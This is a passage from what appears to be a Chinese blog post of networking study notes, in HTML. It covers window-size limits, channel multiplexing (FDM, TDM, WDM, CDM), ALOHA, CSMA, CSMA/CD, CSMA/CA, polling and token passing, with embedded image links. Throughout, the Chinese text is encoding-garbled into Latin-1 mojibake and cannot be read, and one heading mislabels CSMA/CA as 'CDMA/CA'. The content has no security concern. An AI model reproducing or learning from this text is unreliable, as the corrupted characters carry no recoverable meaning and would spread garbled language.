<strong>çª—å£é•¿åº¦é™åˆ¶</strong></p><p>çª—å£é•¿åº¦è¿‡é•¿ä¼šå¯¼è‡´äºŒä¹‰æ€§çš„é—®é¢˜ï¼Œå³æ¥æ”¶æ–¹æ— æ³•åŒºåˆ†æ˜¯æ–°å¸§è¿˜æ˜¯æ—§å¸§ï¼Œå‘é€çª—å£çš„å¤§å°æœ€å¥½ç­‰äºæ¥æ”¶çª—å£</p><p><img src="http://cdn.clown2024.cn/202407151539769.png" alt="image-20240331160748621"></p><blockquote><p>næ˜¯æ¯”ç‰¹ä½æ•°</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151539770.png" alt="image-20240331160808971"></p><p><strong>SRåè®®æ€»ç»“</strong></p><p><img src="http://cdn.clown2024.cn/202407151539771.png" alt="image-20240331161019994"></p><h1 id="ä»‹è´¨è®¿é—®æ§åˆ¶"><a href="#ä»‹è´¨è®¿é—®æ§åˆ¶" class="headerlink" title="ä»‹è´¨è®¿é—®æ§åˆ¶"></a>ä»‹è´¨è®¿é—®æ§åˆ¶</h1><p><strong>ä¼ è¾“æ•°æ®ä½¿ç”¨çš„ä¸¤ç§é“¾è·¯</strong></p><ol><li><p>ç‚¹å¯¹ç‚¹é“¾è·¯ï¼šä¸¤ä¸ªç›¸é‚»èŠ‚ç‚¹é€šè¿‡ä¸€ä¸ªé“¾è·¯ç›¸è¿ï¼Œæ²¡æœ‰ç¬¬ä¸‰è€…ï¼›</p><p>åº”ç”¨ï¼šPPPåè®®ï¼Œå¸¸ç”¨äºå¹¿åŸŸç½‘ã€‚</p></li><li><p>å¹¿æ’­å¼é“¾è·¯ï¼šæ‰€æœ‰ä¸»æœºå…±äº«é€šä¿¡ä»‹è´¨ï¼›</p><p>åº”ç”¨ï¼šæ—©æœŸçš„æ€»çº¿ä»¥å¤ªç½‘ã€æ— çº¿å±€åŸŸç½‘ï¼Œå¸¸ç”¨äºå±€åŸŸç½‘</p><p>å…¸å‹æ‹“æ‰‘ç»“æ„ï¼šæ€»çº¿å‹ã€æ˜Ÿå‹(é€»è¾‘æ€»çº¿å‹)</p></li></ol><p><strong>ä»‹è´¨è®¿é—®æ§åˆ¶</strong></p><p>å°±æ˜¯é‡‡å–ä¸€å®šçš„æªæ–½ï¼Œä½¿å¾—ä¸¤å¯¹èŠ‚ç‚¹ä¹‹é—´çš„é€šä¿¡ä¸ä¼šå‘ç”Ÿäº’ç›¸å¹²æ‰°çš„æƒ…å†µã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539772.png" alt="image-20240331223817687"></p><blockquote><p>åŠ¨æ€åˆ†é…çš„ç‰¹ç‚¹ï¼šä¿¡é“å¹¶éåœ¨ç”¨æˆ·é€šä¿¡æ—¶å›ºå®šåˆ†é…ç»™ç”¨æˆ·ã€‚</p><p>ä¸‰ç§è®¿é—®æ§åˆ¶åè®®ä¸­åªæœ‰éšæœºè®¿é—®ä¼šå‘ç”Ÿå†²çª</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151539773.png" alt="image-20240401001558136"></p><h2 id="ä¿¡é“åˆ’åˆ†ä»‹è´¨è®¿é—®æ§åˆ¶"><a href="#ä¿¡é“åˆ’åˆ†ä»‹è´¨è®¿é—®æ§åˆ¶" class="headerlink" title="ä¿¡é“åˆ’åˆ†ä»‹è´¨è®¿é—®æ§åˆ¶"></a>ä¿¡é“åˆ’åˆ†ä»‹è´¨è®¿é—®æ§åˆ¶</h2><p>ä½¿ç”¨ä»‹è´¨çš„æ¯ä¸ªè®¾å¤‡ä¸æ¥è‡ªåŒä¸€ä¿¡é“ä¸Šçš„å…¶ä»–è®¾å¤‡çš„é€šä¿¡éš”ç¦»å¼€ï¼ŒæŠŠæ—¶åŸŸå’Œé¢‘åŸŸèµ„æºåˆç†åœ°åˆ†é…ç»™ç½‘ç»œä¸Šçš„è®¾å¤‡ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539774.png" alt="image-20240331224034767"></p><h3 id="fdm"><a href="#FDM" class="headerlink" title="FDM"></a>FDM</h3><p><strong>é¢‘åˆ†å¤šè·¯å¤ç”¨</strong></p><p>ç”¨æˆ·åœ¨åˆ†é…åˆ°ä¸€å®šçš„é¢‘å¸¦åï¼Œåœ¨é€šä¿¡è¿‡ç¨‹ä¸­è‡ªå§‹è‡³ç»ˆéƒ½å ç”¨è¿™ä¸ªé¢‘å¸¦ã€‚é¢‘åˆ†å¤ç”¨çš„æ‰€æœ‰ç”¨æˆ·åœ¨åŒæ ·çš„æ—¶é—´å ç”¨ä¸åŒçš„å¸¦å®½(é¢‘ç‡å¸¦å®½)èµ„æºã€‚</p><p>å……åˆ†åˆ©ç”¨ä¼ è¾“ä»‹è´¨å¸¦å®½ï¼Œç³»ç»Ÿæ•ˆç‡è¾ƒé«˜:ç”±äºæŠ€æœ¯æ¯”è¾ƒæˆç†Ÿï¼Œå®ç°ä¹Ÿæ¯”è¾ƒå®¹æ˜“ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539775.png" alt="image-20240331224236833"></p><h3 id="tdm"><a href="#TDM" class="headerlink" title="TDM"></a>TDM</h3><p><strong>æ—¶åˆ†å¤šè·¯å¤ç”¨</strong></p><p>å°†æ—¶é—´åˆ’åˆ†ä¸ºä¸€æ®µæ®µç­‰é•¿çš„æ—¶åˆ†å¤ç”¨å¸§(TDMå¸§)ã€‚æ¯ä¸€ä¸ªæ—¶åˆ†å¤ç”¨çš„ç”¨æˆ·åœ¨æ¯ä¸€ä¸ªTDMå¸§ä¸­å ç”¨å›ºå®šåºå·çš„æ—¶éš™ï¼Œæ‰€æœ‰ç”¨æˆ·è½®æµå ç”¨ä¿¡é“ã€‚å¯ä»¥æé«˜ä¿¡é“åˆ©ç”¨ç‡ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539776.png" alt="image-20240331224352471"></p><p><strong>ç»Ÿè®¡æ—¶åˆ†å¤ç”¨STDM</strong></p><p><img src="http://cdn.clown2024.cn/202407151539777.png" alt="image-20240331224551762"></p><h3 id="wdm"><a href="#WDM" class="headerlink" title="WDM"></a>WDM</h3><p><strong>æ³¢åˆ†å¤šè·¯å¤ç”¨</strong></p><p>æ³¢åˆ†å¤šè·¯å¤ç”¨å°±æ˜¯å…‰çš„é¢‘åˆ†å¤šè·¯å¤ç”¨ï¼Œåœ¨ä¸€æ ¹å…‰çº¤ä¸­ä¼ è¾“å¤šç§ä¸åŒæ³¢é•¿(é¢‘ç‡)çš„å…‰ä¿¡å·ï¼Œç”±äºæ³¢é•¿(é¢‘ç‡)ä¸åŒï¼Œæ‰€ä»¥å„è·¯å…‰ä¿¡å·äº’ä¸å¹²æ‰°ï¼Œæœ€åå†ç”¨æ³¢é•¿åˆ†è§£å¤ç”¨å™¨å°†å„è·¯æ³¢é•¿åˆ†è§£å‡ºæ¥ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539778.png" alt="image-20240331224810520"></p><h3 id="cdm"><a href="#CDM" class="headerlink" title="CDM"></a>CDM</h3><p><strong>ç åˆ†å¤šè·¯å¤ç”¨</strong></p><p><img src="http://cdn.clown2024.cn/202407151539779.png" alt="image-20240331225152377"></p><h2 id="éšæœºè®¿é—®ä»‹è´¨è®¿é—®æ§åˆ¶"><a href="#éšæœºè®¿é—®ä»‹è´¨è®¿é—®æ§åˆ¶" class="headerlink" title="éšæœºè®¿é—®ä»‹è´¨è®¿é—®æ§åˆ¶"></a>éšæœºè®¿é—®ä»‹è´¨è®¿é—®æ§åˆ¶</h2><p>æ‰€æœ‰ç”¨æˆ·å¯éšæœºå‘é€ä¿¡æ¯ï¼Œå‘é€ä¿¡æ¯æ—¶å å…¨éƒ¨å¸¦å®½ã€‚</p><h3 id="alohaåè®®"><a href="#ALOHAåè®®" class="headerlink" title="ALOHAåè®®"></a>ALOHAåè®®</h3><p>è¯¥åè®®åˆ†ä¸ºä¸¤ç§ï¼š</p><ol><li>çº¯ALOHAåè®®</li><li>æ—¶éš™ALOHAåè®®</li></ol><p><strong>çº¯ALOHAåè®®</strong></p><p>ä¸ç›‘å¬ä¿¡é“ï¼Œä¸æŒ‰æ—¶é—´æ§½å‘é€ï¼Œéšæœºé‡å‘ã€‚æƒ³å‘å°±å‘</p><p><img src="http://cdn.clown2024.cn/202407151539780.png" alt="image-20240331225826465"></p><ul><li>å†²çªæ£€æµ‹ï¼šå¦‚æœå‘ç”Ÿå†²çªï¼Œæ¥æ”¶æ–¹åœ¨å°±ä¼šæ£€æµ‹å‡ºå·®é”™ç„¶åä¸äºˆç¡®è®¤ï¼Œå‘é€æ–¹åœ¨ä¸€å®šæ—¶é—´å†…æ”¶ä¸åˆ°å°±åˆ¤æ–­å‘ç”Ÿå†²çªã€‚</li><li>å†²çªå¦‚ä½•è§£å†³ï¼šè¶…æ—¶åç­‰ä¸€éšæœºæ—¶é—´å†é‡ä¼ ã€‚</li></ul><p><strong>æ—¶éš™ALOHAåè®®</strong></p><p>æ—¶éš™ALOHAåè®®çš„æ€æƒ³ï¼šæŠŠæ—¶é—´åˆ†æˆè‹¥å¹²ä¸ªç›¸åŒçš„æ—¶é—´ç‰‡ï¼Œæ‰€æœ‰ç”¨æˆ·åœ¨æ—¶é—´ç‰‡å¼€å§‹æ—¶åˆ»åŒæ­¥æ¥å…¥ç½‘ç»œä¿¡é“è‹¥å‘ç”Ÿå†²çªï¼Œåˆ™å¿…é¡»ç­‰åˆ°ä¸‹ä¸€ä¸ªæ—¶é—´ç‰‡å¼€å§‹æ—¶åˆ»å†å‘é€ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539781.png" alt="image-20240331230108274"></p><ol><li>çº¯ALOHAæ¯”æ—¶éš™ALOHAååé‡æ›´ä½ï¼Œæ•ˆç‡æ›´ä½ã€‚</li><li>çº¯ALOHAæƒ³å‘å°±å‘ï¼Œæ—¶éš™ALOHAåªæœ‰åœ¨æ—¶é—´ç‰‡æ®µå¼€å§‹æ—¶æ‰èƒ½å‘ã€‚</li></ol><h3 id="csmaåè®®"><a href="#CSMAåè®®" class="headerlink" title="CSMAåè®®"></a>CSMAåè®®</h3><p>å³å«åšè½½æ³¢ç›‘å¬å¤šè·¯è®¿é—®åè®®CSMA(carrier sense multiple access)</p><ul><li><p><strong>CS</strong>ï¼šè½½æ³¢ä¾¦å¬&#x2F;ç›‘å¬ï¼Œæ¯ä¸€ä¸ªç«™åœ¨å‘é€æ•°æ®ä¹‹å‰è¦æ£€æµ‹ä¸€ä¸‹æ€»çº¿ä¸Šæ˜¯å¦æœ‰å…¶ä»–è®¡ç®—æœºåœ¨å‘é€æ•°æ®ã€‚</p><blockquote><p>å½“å‡ ä¸ªç«™åŒæ—¶åœ¨æ€»çº¿ä¸Šå‘é€æ•°æ®æ—¶ï¼Œæ€»çº¿ä¸Šçš„ä¿¡å·ç”µå‹æ‘†åŠ¨å€¼å°†ä¼šå¢å¤§(äº’ç›¸å åŠ )ã€‚å½“ä¸€ä¸ªç«™æ£€æµ‹åˆ°çš„ä¿¡å·ç”µå‹æ‘†åŠ¨å€¼è¶…è¿‡ä¸€å®šé—¨é™å€¼æ—¶ï¼Œå°±è®¤ä¸ºæ€»çº¿ä¸Šè‡³å°‘æœ‰ä¸¤ä¸ªç«™åŒæ—¶åœ¨å‘é€æ•°æ®ï¼Œè¡¨æ˜äº§ç”Ÿäº†ç¢°æ’ï¼Œå³å‘ç”Ÿäº†å†²çªã€‚</p></blockquote></li><li><p><strong>MA</strong>ï¼šå¤šç‚¹æ¥å…¥ï¼Œè¡¨ç¤ºè®¸å¤šè®¡ç®—æœºä»¥å¤šç‚¹æ¥å…¥çš„æ–¹å¼è¿æ¥åœ¨ä¸€æ ¹æ€»çº¿ä¸Šã€‚</p></li></ul><p><img src="http://cdn.clown2024.cn/202407151539782.png" alt="image-20240331232412543"></p><ol><li><p><strong>1-åšæŒCSMA</strong>ï¼š</p><p>å¦‚æœä¸€ä¸ªä¸»æœºè¦å‘é€æ¶ˆæ¯ï¼Œé‚£ä¹ˆå®ƒå…ˆç›‘å¬ä¿¡é“ã€‚<br>ç©ºé—²åˆ™ç›´æ¥ä¼ è¾“ï¼Œä¸å¿…ç­‰å¾…ã€‚<br>å¿™åˆ™ä¸€ç›´ç›‘å¬ï¼Œç›´åˆ°ç©ºé—²é©¬ä¸Šä¼ è¾“ã€‚<br>å¦‚æœæœ‰å†²çª(ä¸€æ®µæ—¶é—´å†…æœªæ”¶åˆ°è‚¯å®šå›å¤)ï¼Œåˆ™ç­‰å¾…ä¸€ä¸ªéšæœºé•¿çš„æ—¶é—´å†ç›‘å¬ï¼Œé‡å¤ä¸Šè¿°è¿‡ç¨‹ã€‚</p><p>ä¼˜ç‚¹ï¼šåªè¦åª’ä½“ç©ºé—²ï¼Œç«™ç‚¹å°±é©¬ä¸Šå‘é€ï¼Œé¿å…äº†åª’ä½“åˆ©ç”¨ç‡çš„æŸå¤±ã€‚<br>ç¼ºç‚¹ï¼šå‡å¦‚æœ‰ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„ç«™ç‚¹æœ‰æ•°æ®è¦å‘é€ï¼Œå†²çªå°±ä¸å¯é¿å…ã€‚</p></li><li><p><strong>éåšæŒCSMA</strong>ï¼š</p><p>å¦‚æœä¸€ä¸ªä¸»æœºè¦å‘é€æ¶ˆæ¯ï¼Œé‚£ä¹ˆå®ƒå…ˆç›‘å¬ä¿¡é“ç©ºé—²åˆ™ç›´æ¥ä¼ è¾“ï¼Œä¸å¿…ç­‰å¾…ã€‚å¿™åˆ™ç­‰å¾…ä¸€ä¸ªéšæœºçš„æ—¶é—´ä¹‹åå†è¿›è¡Œç›‘å¬ã€‚</p><p>ä¼˜ç‚¹ï¼šé‡‡ç”¨éšæœºçš„é‡å‘å»¶è¿Ÿæ—¶é—´å¯ä»¥å‡å°‘å†²çªå‘ç”Ÿçš„å¯èƒ½æ€§ã€‚</p><p>ç¼ºç‚¹ï¼šå¯èƒ½å­˜åœ¨å¤§å®¶éƒ½åœ¨å»¶è¿Ÿç­‰å¾…è¿‡ç¨‹ä¸­ï¼Œä½¿å¾—åª’ä½“ä»å¯èƒ½å¤„äºç©ºé—²çŠ¶æ€ï¼Œåª’ä½“ä½¿ç”¨ç‡é™ä½</p></li><li><p><strong>p-åšæŒCSMAåè®®</strong>ï¼šp-åšæŒæŒ‡çš„æ˜¯å¯¹äºç›‘å¬ä¿¡é“ç©ºé—²çš„å¤„ç†</p><p>å¦‚æœä¸€ä¸ªä¸»æœºè¦å‘é€æ¶ˆæ¯ï¼Œé‚£ä¹ˆå®ƒå…ˆç›‘å¬ä¿¡é“</p><p>ç©ºé—²åˆ™ä»¥pæ¦‚ç‡ç›´æ¥ä¼ è¾“ï¼Œä¸å¿…ç­‰å¾…ï¼›æ¦‚ç‡1-pç­‰å¾…åˆ°ä¸‹ä¸€ä¸ªæ—¶é—´æ§½å†ä¼ è¾“ã€‚</p><p>å¿™åˆ™æŒç»­ç›‘å¬ç›´åˆ°ä¿¡é“ç©ºé—²å†ä»¥pæ¦‚ç‡å‘é€ã€‚</p><p>è‹¥å†²çªåˆ™ç­‰åˆ°ä¸‹ä¸€ä¸ªæ—¶é—´æ§½å¼€å§‹å†ç›‘å¬å¹¶é‡å¤ä¸Šè¿°è¿‡ç¨‹ã€‚</p><p>ä¼˜ç‚¹ï¼šæ—¢èƒ½åƒéåšæŒç®—æ³•é‚£æ ·å‡å°‘å†²çªï¼Œåˆèƒ½åƒ1-åšæŒç®—æ³•é‚£æ ·å‡å°‘åª’ä½“ç©ºé—²æ—¶é—´çš„è¿™ç§æ–¹æ¡ˆ</p><p>ç¼ºç‚¹ï¼šå‘ç”Ÿå†²çªåè¿˜æ˜¯è¦åšæŒæŠŠæ•°æ®å¸§å‘é€å®Œï¼Œé€ æˆäº†æµªè´¹ã€‚</p></li></ol><p><img src="http://cdn.clown2024.cn/202407151539784.png" alt="image-20240331233405613"></p><h3 id="csmax2fcdåè®®"><a href="#CSMA-CDåè®®" class="headerlink" title="CSMA&#x2F;CDåè®®"></a>CSMA&#x2F;CDåè®®</h3><p>è½½æ³¢ç›‘å¬å¤šç‚¹æ¥å…¥&#x2F;ç¢°æ’æ£€æµ‹CSMA&#x2F;CD(carrier sense multiple access with collision detection)</p><ul><li><strong>CS</strong>ï¼šè½½æ³¢ä¾¦å¬&#x2F;ç›‘å¬ï¼Œæ¯ä¸€ä¸ªç«™åœ¨å‘é€æ•°æ®ä¹‹å‰ä»¥åŠå‘é€æ•°æ®æ—¶éƒ½è¦æ£€æµ‹ä¸€ä¸‹æ€»çº¿ä¸Šæ˜¯å¦æœ‰å…¶ä»–è®¡ç®—æœºåœ¨å‘é€æ•°æ®ã€‚å’Œä¸Šé¢çš„ç›¸æ¯”å¤šäº†ä¸€ä¸ªå‘é€æ—¶ç›‘å¬ã€‚</li><li><strong>MA</strong>ï¼šå¤šç‚¹æ¥å…¥ï¼Œè¡¨ç¤ºè®¸å¤šè®¡ç®—æœºä»¥å¤šç‚¹æ¥å…¥çš„æ–¹å¼è¿æ¥åœ¨ä¸€æ ¹æ€»çº¿ä¸Šã€‚æ€»çº¿å‹ç½‘ç»œã€‚</li><li><strong>CD</strong>ï¼šç¢°æ’æ£€æµ‹(å†²çªæ£€æµ‹)ï¼Œâ€œè¾¹å‘é€è¾¹ç›‘å¬ï¼Œé€‚é…å™¨è¾¹å‘é€æ•°æ®è¾¹æ£€æµ‹ä¿¡é“ä¸Šä¿¡å·ç”µå‹çš„å˜åŒ–æƒ…å†µï¼Œä»¥ä¾¿åˆ¤æ–­è‡ªå·±åœ¨å‘é€æ•°æ®æ—¶å…¶ä»–ç«™æ˜¯å¦ä¹Ÿåœ¨å‘é€æ•°æ®ã€‚è¯´æ˜ç”¨äºåŠåŒå·¥ç½‘ç»œã€‚</li></ul><p><strong>ä¼ æ’­æ—¶å»¶å¯¹è½½æ³¢ç›‘å¬çš„å½±å“</strong></p><p><img src="http://cdn.clown2024.cn/202407151539785.png" alt="image-20240331234826159"></p><p><strong>ç¢°æ’åçš„é‡ä¼ æœºåˆ¶</strong></p><p>ä½¿ç”¨æˆªæ–­äºŒè¿›åˆ¶æŒ‡æ•°è§„é¿ç®—æ³•</p><p><img src="http://cdn.clown2024.cn/202407151539786.png" alt="image-20240331235336764"></p><p><strong>æœ€å°å¸§é•¿é—®é¢˜</strong></p><p>å› ä¸ºè¯¥åè®®å°±æ˜¯ä¸ºäº†å³ä½¿æ§åˆ¶å¸§çš„ä¼ è¾“ï¼Œå¦‚æœå¸§å·²ç»å‘å®Œäº†å°±æ²¡æœ‰æ§åˆ¶çš„æ„ä¹‰äº†ï¼Œæ‰€ä»¥ä¼šè§„å®šä¸€ä¸ªæœ€å°å¸§é•¿ä»¥ä¾¿åœ¨å¸§å‘é€å®Œä¹‹å‰å¯ä»¥æ£€æµ‹åˆ°å†²çªå¹¶åŠæ—¶æ§åˆ¶ä¼ è¾“ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539787.png" alt="image-20240331235646524"></p><blockquote><p>ä»¥å¤ªç½‘è§„å®šçš„æœ€çŸ­å¸§é•¿ä¸º64Bï¼Œæ‰€ä»¥é•¿åº¦å°äº64Bçš„éƒ½æ˜¯ç”±äºå†²çªè€Œå¼‚å¸¸ç»ˆæ­¢çš„æ— æ•ˆå¸§ã€‚</p></blockquote><h3 id="cdmax2fcaåè®®"><a href="#CDMA-CAåè®®" class="headerlink" title="CDMA&#x2F;CAåè®®"></a>CDMA&#x2F;CAåè®®</h3><p>è½½æ³¢ç›‘å¬å¤šç‚¹æ¥å…¥&#x2F;ç¢°æ’é¿å…CSMA&#x2F;CA(carrier sense multiple access with collision avoidance)</p><p><img src="http://cdn.clown2024.cn/202407151539788.png" alt="image-20240401000102318"></p><p><strong>å·¥ä½œåŸç†</strong></p><ol><li>å‘é€æ•°æ®å‰ï¼Œå…ˆæ£€æµ‹ä¿¡é“æ˜¯å¦ç©ºé—²</li><li>ç©ºé—²åˆ™å‘å‡ºRTS(request to send)ï¼ŒRTSåŒ…æ‹¬å‘å°„ç«¯çš„åœ°å€ã€æ¥æ”¶ç«¯çš„åœ°å€ã€ä¸‹ä¸€ä»½æ•°æ®å°†æŒç»­å‘é€çš„æ—¶é—´ç­‰ä¿¡æ¯;ä¿¡é“å¿™åˆ™ç­‰å¾…ã€‚</li><li>æ¥æ”¶ç«¯æ”¶åˆ°RTSåï¼Œå°†å“åº”CTS(clear tosend)</li><li>å‘é€ç«¯æ”¶åˆ°CTSåï¼Œå¼€å§‹å‘é€æ•°æ®å¸§(åŒæ—¶é¢„çº¦ä¿¡é“:å‘é€æ–¹å‘ŠçŸ¥å…¶ä»–ç«™ç‚¹è‡ªå·±è¦ä¼ å¤šä¹…æ•°æ®)ã€‚</li><li>æ¥æ”¶ç«¯æ”¶åˆ°æ•°æ®å¸§åï¼Œå°†ç”¨CRCæ¥æ£€éªŒæ•°æ®æ˜¯å¦æ­£ç¡®ï¼Œæ­£ç¡®åˆ™å“åº”ACKå¸§ã€‚</li><li>å‘é€æ–¹æ”¶åˆ°ACKå°±å¯ä»¥è¿›è¡Œä¸‹ä¸€ä¸ªæ•°æ®å¸§çš„å‘é€ï¼Œè‹¥æ²¡æœ‰åˆ™ä¸€ç›´é‡ä¼ è‡³è§„å®šé‡å‘æ¬¡æ•°ä¸ºæ­¢(é‡‡ç”¨äºŒè¿›åˆ¶æŒ‡æ•°é€€é¿ç®—æ³•æ¥ç¡®å®šéšæœºçš„æ¨è¿Ÿæ—¶é—´)ã€‚</li></ol><blockquote><p>RTS&#x2F;CTSæ˜¯å¯é€‰çš„çš„ï¼Œä¸»è¦ç”¨äºè§£å†³éšè”½ç«™çš„é—®é¢˜ï¼Œä½†æ˜¯ä¸€å®šè¦æˆå¯¹å‡ºç°ã€‚</p></blockquote><h3 id="cdå’Œcaçš„å¯¹æ¯”"><a href="#CDå’ŒCAçš„å¯¹æ¯”" class="headerlink" title="CDå’ŒCAçš„å¯¹æ¯”"></a>CDå’ŒCAçš„å¯¹æ¯”</h3><p><strong>ç›¸åŒç‚¹ï¼š</strong><br>CSMA&#x2F;CDä¸CSMA&#x2F;CAæœºåˆ¶éƒ½ä»å±äºCSMAçš„æ€è·¯ï¼Œå…¶æ ¸å¿ƒæ˜¯å…ˆå¬å†è¯´ã€‚æ¢è¨€ä¹‹ï¼Œä¸¤ä¸ªåœ¨æ¥å…¥ä¿¡é“ä¹‹å‰éƒ½é¡»è¦è¿›è¡Œç›‘å¬ã€‚å½“å‘ç°ä¿¡é“ç©ºé—²åï¼Œæ‰èƒ½è¿›è¡Œæ¥å…¥ã€‚<br><strong>ä¸åŒç‚¹ï¼š</strong></p><ol><li>ä¼ è¾“ä»‹è´¨ä¸åŒ:CSMA&#x2F;CDç”¨äºæ€»çº¿å¼ä»¥å¤ªç½‘ã€æœ‰çº¿ã€‘ï¼Œè€ŒCSMACAç”¨äºæ— çº¿å±€åŸŸç½‘ã€æ— çº¿ã€‘</li><li>è½½æ³¢æ£€æµ‹æ–¹å¼ä¸åŒ:å› ä¼ è¾“ä»‹è´¨ä¸åŒï¼ŒCSMA&#x2F;CDä¸CSMA&#x2F;CAçš„æ£€æµ‹æ–¹å¼ä¹Ÿä¸åŒã€‚CSMA&#x2F;CDé€šè¿‡ç”µç¼†ä¸­ç”µå‹çš„å˜åŒ–æ¥æ£€æµ‹ï¼Œå½“æ•°æ®å‘ç”Ÿç¢°æ’æ—¶ï¼Œç”µç¼†ä¸­çš„ç”µå‹å°±ä¼šéšç€å‘ç”Ÿå˜åŒ–ï¼›è€ŒCSMA&#x2F;CAé‡‡ç”¨èƒ½é‡æ£€æµ‹(ED)ã€è½½æ³¢æ£€æµ‹(CS)å’Œèƒ½é‡è½½æ³¢æ··åˆæ£€æµ‹ä¸‰ç§æ£€æµ‹ä¿¡é“ç©ºé—²çš„æ–¹å¼ã€‚</li><li>CSMA&#x2F;CDæ£€æµ‹å†²çªï¼ŒCSMA&#x2F;CAé¿å…å†²çªï¼ŒäºŒè€…å‡ºç°å†²çªåéƒ½ä¼šè¿›è¡Œæœ‰ä¸Šé™çš„é‡ä¼ ã€‚</li></ol><h2 id="è½®è¯¢è®¿é—®ä»‹è´¨è®¿é—®æ§åˆ¶"><a href="#è½®è¯¢è®¿é—®ä»‹è´¨è®¿é—®æ§åˆ¶" class="headerlink" title="è½®è¯¢è®¿é—®ä»‹è´¨è®¿é—®æ§åˆ¶"></a>è½®è¯¢è®¿é—®ä»‹è´¨è®¿é—®æ§åˆ¶</h2><h3 id="è½®è¯¢åè®®"><a href="#è½®è¯¢åè®®" class="headerlink" title="è½®è¯¢åè®®"></a>è½®è¯¢åè®®</h3><p>ä¸»ç»“ç‚¹è½®æµâ€é‚€è¯·â€ä»å±ç»“ç‚¹å‘é€æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è½®è¯¢å‘é€ä¸€ä¸ªçŸ­çš„è¯¢é—®å¸§çœ‹ä»å±ç»“ç‚¹æ˜¯å¦è¦å‘é€æ•°æ®</p><p><img src="http://cdn.clown2024.cn/202407151539789.png" alt="image-20240401002015624"></p><p>ä¸è¿‡ä¼šå¸¦æ¥ä¸€äº›é—®é¢˜ï¼š</p><ol><li>è½®è¯¢å¼€é”€</li><li>ç­‰å¾…å»¶è¿Ÿ</li><li>å•ç‚¹æ•…éšœ</li></ol><h3 id="ä»¤ç‰Œä¼ é€’åè®®"><a href="#ä»¤ç‰Œä¼ é€’åè®®" class="headerlink" title="ä»¤ç‰Œä¼ é€’åè®®"></a>ä»¤ç‰Œä¼ é€’åè®®</h3><p><strong>ä»¤ç‰Œ</strong>ï¼šä¸€ä¸ªç‰¹æ®Šæ ¼å¼çš„MACæ§åˆ¶å¸§ï¼Œä¸å«ä»»ä½•åè®®</p><p>ä»¤ç‰Œç”¨äºæ§åˆ¶ä¿¡é“çš„ä½¿ç”¨ï¼Œç¡®ä¿åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªç»“ç‚¹ç‹¬å ä¿¡é“ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539790.png" alt="image-20240401002623143"></p><blockquote><p>å·¥ä½œæµç¨‹å¤§æ¦‚å¦‚ä¸‹ï¼š</p><p>å‡è®¾Dè¦ç»™Aå‘é€æ•°æ®ï¼ŒDæŒæœ‰ä»¤ç‰Œä¹‹åä¿®æ”¹æ§åˆ¶å¸§è¡¨ç¤ºå·²ç»ä½¿ç”¨ï¼Œç„¶ååœ¨ä»¤ç‰Œåé¢å¸¦ä¸Šæ•°æ®æ„æˆæ•°æ®å¸§ï¼Œç„¶åè¯¥æ•°æ®å¸§å°±åœ¨ä»¤ç‰Œç¯ä¸­è¿›è¡Œä¼ é€’ï¼Œå½“ä¼ åˆ°ä¸»æœºAçš„æ—¶å€™å‘ç°æ˜¯å‘é€ç»™è‡ªå·±çš„å°±å¤åˆ¶è¿™ä¸€ä»½æ•°æ®ï¼Œç„¶åä»¤ç‰Œä¼ ç»™Dï¼›Då†æ£€æŸ¥è‡ªå·±çš„æ•°æ®æœ‰æ²¡æœ‰å‡ºç°é—®é¢˜éœ€ä¸éœ€è¦é‡ä¼ ï¼Œç¡®è®¤å®Œæ¯•ä¹‹åå°±å›æ”¶æ•°æ®ï¼Œå†è¿˜åŸä»¤ç‰Œçš„æ§åˆ¶å¸§ç„¶åå°†ä»¤ç‰Œç»§ç»­ä¼ é€’ã€‚</p></blockquote><p>æ¯ä¸ªç»“ç‚¹éƒ½å¯ä»¥åœ¨ä¸€å®šæ—¶é—´å†…(ä»¤ç‰ŒæŒæœ‰æ—¶é—´)è·å¾—å‘é€æ•°æ®çš„æƒåˆ©ï¼Œå¹¶ä¸æ˜¯æ— é™åˆ¶çš„æŒæœ‰ä»¤ç‰Œï¼›å¦‚æœå‘é€æ•°æ®è¿‡å¤§åœ¨ä¸€ä¸ªä»¤ç‰Œæ—¶é—´å†…æ— æ³•å‘é€å®Œå°±éœ€è¦åˆ†æ¬¡å‘é€ï¼Œç­‰å¾…ä¸‹ä¸€æ¬¡ä»¤ç‰Œä¼ é€’ã€‚</p><p><strong>è¯¥åè®®ä¹Ÿä¼šäº§ç”Ÿä¸€äº›é—®é¢˜</strong></p><ol><li>ä»¤ç‰Œå¼€é”€</li><li>ç­‰å¾…å»¶è¿Ÿ</li><li>å•ç‚¹æ•…éšœ</li></ol><blockquote><p>è¯¥åè®®åº”ç”¨äºä»¤ç‰Œç¯ç½‘ï¼ˆç‰©ç†æ˜Ÿå‹æ‹“æ‰‘ï¼Œé€»è¾‘ç¯å½¢æ‹“æ‰‘ï¼‰</p><p>è¯¥æ–¹å¼å¸¸ç”¨äºè´Ÿè½½è¾ƒé‡ã€é€šä¿¡é‡è¾ƒå¤§çš„ç½‘ç»œä¸­ï¼Œå› ä¸ºå¦‚æœè¾ƒä¸ºç©ºé—²çš„ç½‘ç»œä¸­ï¼Œä»¤ç‰Œå¯èƒ½ä¼šä¸€ç›´ä¼ é€’ä½†æ²¡æœ‰ä½¿ç”¨é€ æˆæµªè´¹ã€‚</p></blockquote><h1 id="å±€åŸŸç½‘"><a href="#å±€åŸŸç½‘" class="headerlink" title="å±€åŸŸç½‘"></a>å±€åŸŸç½‘</h1><p>å±€åŸŸç½‘(Local Area 